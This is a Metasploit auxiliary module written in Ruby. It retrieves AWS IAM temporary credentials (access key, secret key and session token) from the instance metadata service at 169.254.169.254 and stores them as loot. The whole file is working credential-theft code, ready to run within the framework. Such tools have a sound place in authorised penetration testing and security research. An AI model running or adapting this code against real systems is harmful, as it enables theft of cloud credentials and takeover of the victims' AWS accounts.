##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(
      info,
      'Name' => 'Amazon Web Services (AWS) API Key Retrieval',
      'Description' => %q{
        Pulls AWS API access and secret keys (and token) from the metadata service.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Javier Godinez <godinezj[at]gmail.com>']))

      register_options(
        [
          OptString.new('RPORT', [ true, 'The metadata service TCP Port', '80']),
          OptString.new('RHOST', [ true, 'The metadata service IP', '169.254.169.254']),
        ], self.class)
      deregister_options('VHOST', 'Proxies')
  end

  def run
    print_status("#{peer} - Checking access...")
    url = '/2012-01-12/meta-data/iam/security-credentials/'
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => url
      }, 5)
    prof = res.body
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => "#{url}#{prof}/"
      }, 5)
    path = store_loot("#{prof}.json", 'text/plain', datastore['RHOST'], res.body)
    print_good("Temporary API keys stored at: " + path)
  rescue Rex::ConnectionTimeout
    print_error "Could not connec to the metadata service: #{datastore['RHOST'].inspect}"
  end
end

